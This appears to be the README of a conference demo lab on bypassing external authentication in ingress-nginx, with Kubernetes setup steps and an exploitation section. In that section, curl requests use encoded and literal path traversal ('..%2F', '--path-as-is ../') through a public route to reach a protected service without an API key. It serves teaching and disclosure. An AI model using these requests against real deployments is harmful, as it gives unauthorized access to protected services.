# Presentation

From:

* BSides Krakow 2022
* The Hack Summit 2022

[Get presentation](Bypassing%20external%20authentication%20in%20ingress-nginx.pptx)

# Installation

* install minikube
* deploy ingress-nginx using helm
```
helm upgrade --install ingress-nginx ingress-nginx \
  --repo https://kubernetes.github.io/ingress-nginx \
  --namespace ingress-nginx --create-namespace --version 4.0.9
```
* apply kubernetes configuration: `kubectl apply -f app.yaml`
* forward ingress port: `kubectl port-forward service/ingress-nginx-controller -n ingress-nginx 8080:80`

### Optionally

If you would like to customize images, build them and load into minikube:

* build docker images:
  * `cd auth-service; docker build -t auth-service:0.0.4 .`
  * `cd protected-service; docker build -t protected-service:0.0.1 .`
  * `cd public-service; docker build -t public-service:0.0.1 .`
* push docker images into minikube:
  * `minikube image load auth-service:0.0.4`
  * `minikube image load protected-service:0.0.1`
  * `minikube image load public-service:0.0.1`

# Exploitation

To access public service: `curl -v http://127.0.0.1:8080/public-service/public -H "Host: app.test"` --> return 200

To access protected service: `curl -v http://127.0.0.1:8080/protected-service/protected  -H "Host: app.test"` --> return 401
To access protected service: `curl -v http://127.0.0.1:8080/protected-service/protected -H "X-Api-Key: secret-api-key" -H "Host: app.test"` --> return 200

To access protected service bypassing authentication: `curl -v http://127.0.0.1:8080/public-service/..%2Fprotected-service/protected  -H "Host: app.test"` --> return 200
To access protected service bypassing authentication: `curl --path-as-is -v http://127.0.0.1:8080/public-service/../protected-service/protected  -H "Host: app.test"` --> return 200
